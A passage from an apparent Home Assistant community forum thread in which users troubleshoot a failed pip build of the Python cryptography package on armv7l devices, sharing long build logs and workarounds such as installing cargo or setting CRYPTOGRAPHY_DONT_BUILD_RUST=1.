&#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class="line">  copying src/cryptography/py.typed -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  running build_ext</span><br><span class="line">  generating cffi module &#x27;build/temp.linux-armv7l-3.9/_padding.c&#x27;</span><br><span class="line">  creating build/temp.linux-armv7l-3.9</span><br><span class="line">  generating cffi module &#x27;build/temp.linux-armv7l-3.9/_openssl.c&#x27;</span><br><span class="line">  running build_rust</span><br><span class="line">      Updating crates.io index</span><br><span class="line"></span><br><span class="line">      =============================DEBUG ASSISTANCE=============================</span><br><span class="line">      If you are seeing a compilation error please try the following steps to</span><br><span class="line">      successfully install cryptography:</span><br><span class="line">      1) Upgrade to the latest pip and try again. This will fix errors for most</span><br><span class="line">         users. See: https://pip.pypa.io/en/stable/installing/#upgrading-pip</span><br><span class="line">      2) Read https://cryptography.io/en/latest/installation.html for specific</span><br><span class="line">         instructions for your platform.</span><br><span class="line">      3) Check our frequently asked questions for more information:</span><br><span class="line">         https://cryptography.io/en/latest/faq.html</span><br><span class="line">      4) Ensure you have a recent Rust toolchain installed:</span><br><span class="line">         https://cryptography.io/en/latest/installation.html#rust</span><br><span class="line">      5) If you are experiencing issues with Rust for *this release only* you may</span><br><span class="line">         set the environment variable `CRYPTOGRAPHY_DONT_BUILD_RUST=1`.</span><br><span class="line">      =============================DEBUG ASSISTANCE=============================</span><br><span class="line"></span><br><span class="line">  Traceback (most recent call last):</span><br><span class="line">    File &quot;/srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 363, in &lt;module&gt;</span><br><span class="line">      main()</span><br><span class="line">    File &quot;/srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 345, in main</span><br><span class="line">      json_out[&#x27;return_val&#x27;] = hook(**hook_input[&#x27;kwargs&#x27;])</span><br><span class="line">    File &quot;/srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 261, in build_wheel</span><br><span class="line">      return _build_backend().build_wheel(wheel_directory, config_settings,</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/build_meta.py&quot;, line 230, in build_wheel</span><br><span class="line">      return self._build_with_temp_dir([&#x27;bdist_wheel&#x27;], &#x27;.whl&#x27;,</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/build_meta.py&quot;, line 215, in _build_with_temp_dir</span><br><span class="line">      self.run_setup()</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/build_meta.py&quot;, line 158, in run_setup</span><br><span class="line">      exec(compile(code, __file__, &#x27;exec&#x27;), locals())</span><br><span class="line">    File &quot;setup.py&quot;, line 71, in &lt;module&gt;</span><br><span class="line">      setup(</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/__init__.py&quot;, line 159, in setup</span><br><span class="line">      return distutils.core.setup(**attrs)</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/core.py&quot;, line 148, in setup</span><br><span class="line">      dist.run_commands()</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 966, in run_commands</span><br><span class="line">      self.run_command(cmd)</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 985, in run_command</span><br><span class="line">      cmd_obj.run()</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py&quot;, line 299, in run</span><br><span class="line">      self.run_command(&#x27;build&#x27;)</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class="line">      self.distribution.run_command(command)</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 985, in run_command</span><br><span class="line">      cmd_obj.run()</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/command/build.py&quot;, line 135, in run</span><br><span class="line">      self.run_command(cmd_name)</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class="line">      self.distribution.run_command(command)</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 985, in run_command</span><br><span class="line">      cmd_obj.run()</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/cffi/setuptools_ext.py&quot;, line 144, in run</span><br><span class="line">      base_class.run(self)</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/cffi/setuptools_ext.py&quot;, line 144, in run</span><br><span class="line">      base_class.run(self)</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/setuptools_ext.py&quot;, line 103, in run</span><br><span class="line">      build_rust.run()</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/command.py&quot;, line 52, in run</span><br><span class="line">      self.run_for_extension(ext)</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/build.py&quot;, line 92, in run_for_extension</span><br><span class="line">      dylib_paths = self.build_extension(ext)</span><br><span class="line">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/build.py&quot;, line 131, in build_extension</span><br><span class="line">      metadata = json.loads(check_output(metadata_command))</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/subprocess.py&quot;, line 420, in check_output</span><br><span class="line">      return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,</span><br><span class="line">    File &quot;/usr/local/lib/python3.9/subprocess.py&quot;, line 524, in run</span><br><span class="line">      raise CalledProcessError(retcode, process.args,</span><br><span class="line">  subprocess.CalledProcessError: Command &#x27;[&#x27;cargo&#x27;, &#x27;metadata&#x27;, &#x27;--manifest-path&#x27;, &#x27;src/rust/Cargo.toml&#x27;, &#x27;--format-version&#x27;, &#x27;1&#x27;]&#x27; died with &lt;Signals.SIGSEGV: 11&gt;.</span><br><span class="line">  ----------------------------------------</span><br><span class="line">  ERROR: Failed building wheel for cryptography`</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/ceh">ceh</a>November 6, 2021, 1:04pm#4</p>
<p>I believe you need to install cargo.</p>
<p>sudo apt install cargo</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/trentjw">trentjw</a> (Trenton J Wilson)November 6, 2021, 10:34pm#5</p>
<p>this is what I did just before the pip3 install command</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export CRYPTOGRAPHY_DONT_BUILD_RUST=1</span><br><span class="line"></span><br><span class="line">pip3 install --upgrade homeassistant</span><br></pre></td></tr></table></figure>

<p>1 Like</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/Piotr_Kowalski">Piotr_Kowalski</a> (Piotr Kowalski)November 7, 2021, 9:38am#6</p>
<p>It works, thank you so much!</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/robg">robg</a> (Robert Gallesio)December 6, 2021, 8:23am#7</p>
<p>Cargo didn’t fix the problem but<br>export CRYPTOGRAPHY_DONT_BUILD_RUST=1</p>
<p>did the trick!!!</p>
<p>1 Like</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/maxxer">maxxer</a> (Maxxer)December 14, 2021, 11:39pm#8</p>
<p>I’m trying to build Python 3.8.12 but I’m stuck with the cryptography build error, no way to get rid of it. I tried <code>export</code>, setting the value in <code>.env</code>, passing the var to the pip install command… No way! I don’t know where to look at, any hint is welcome. Thanks</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/Rudhan">Rudhan</a> (Tomas Rudh)December 17, 2021, 9:04pm#9</p>
<p>I also get this error, when trying to upgrade to 2021.12.3. I have tried with</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CRYPTOGRAPHY_DONT_BUILD_RUST=1</span><br></pre></td></tr></table></figure>

<p>but no luck. Also installing cargo does not help. Any ideas?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">  ERROR: Command errored out with exit status 1:</span><br><span class="line">   command: /srv/homeassistant/bin/python3.8 /srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpzoxrpswf</span><br><span class="line">       cwd: /tmp/pip-install-d22wa9ai/cryptography_fd6fd4109a8a463c855d00034731061a</span><br><span class="line">  Complete output (208 lines):</span><br><span class="line">  running bdist_wheel</span><br><span class="line">  running build</span><br><span class="line">  running build_py</span><br><span class="line">  creating build</span><br><span class="line">  creating build/lib.linux-armv7l-3.8</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  copying src/cryptography/exceptions.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  copying src/cryptography/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  copying src/cryptography/fernet.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  copying src/cryptography/__about__.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  copying src/cryptography/utils.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/certificate_transparency.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/base.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/general_name.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/oid.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/name.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/ocsp.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/extensions.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat</span><br><span class="line">  copying src/cryptography/hazmat/_oid.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat</span><br><span class="line">  copying src/cryptography/hazmat/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/backends</span><br><span class="line">  copying src/cryptography/hazmat/backends/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends</span><br><span class="line">  copying src/cryptography/hazmat/backends/interfaces.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/_cipheralgorithm.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/poly1305.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/padding.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/cmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/hashes.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/hmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/keywrap.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/constant_time.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/_serialization.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/_asymmetric.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings</span><br><span class="line">  copying src/cryptography/hazmat/bindings/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/aead.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/x25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/rsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/decode_asn1.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ed448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/poly1305.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/x448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/cmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ed25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/x509.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/dsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/hashes.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/hmac.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ec.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/dh.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ciphers.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/utils.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/backend.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/encode_asn1.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends/openssl</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/pkcs12.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/base.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/pkcs7.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/ssh.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/serialization</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/x25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/rsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/ed448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/x448.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/padding.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/ed25519.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/dsa.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/types.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/ec.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/dh.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/utils.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/totp.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/hotp.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/aead.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/base.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/modes.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/algorithms.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/pbkdf2.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/scrypt.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/x963kdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/kbkdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/concatkdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/hkdf.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives/kdf</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class="line">  copying src/cryptography/hazmat/bindings/openssl/binding.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class="line">  copying src/cryptography/hazmat/bindings/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class="line">  copying src/cryptography/hazmat/bindings/openssl/_conditional.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/openssl</span><br><span class="line">  running egg_info</span><br><span class="line">  writing src/cryptography.egg-info/PKG-INFO</span><br><span class="line">  writing dependency_links to src/cryptography.egg-info/dependency_links.txt</span><br><span class="line">  writing requirements to src/cryptography.egg-info/requires.txt</span><br><span class="line">  writing top-level names to src/cryptography.egg-info/top_level.txt</span><br><span class="line">  reading manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class="line">  reading manifest template &#x27;MANIFEST.in&#x27;</span><br><span class="line">  no previously-included directories found matching &#x27;docs/_build&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;vectors&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;vectors&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.github&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;release.py&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;.coveragerc&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;codecov.yml&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;.readthedocs.yml&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;dev-requirements.txt&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;tox.ini&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;mypy.ini&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.d&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.playbooks&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE.APACHE&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE.BSD&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE.PSF&#x27;</span><br><span class="line">  writing manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class="line">  copying src/cryptography/py.typed -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class="line">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class="line">  copying src/cryptography/hazmat/bindings/_rust/__init__.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class="line">  copying src/cryptography/hazmat/bindings/_rust/asn1.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class="line">  copying src/cryptography/hazmat/bindings/_rust/ocsp.pyi -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/bindings/_rust</span><br><span class="line">  copying 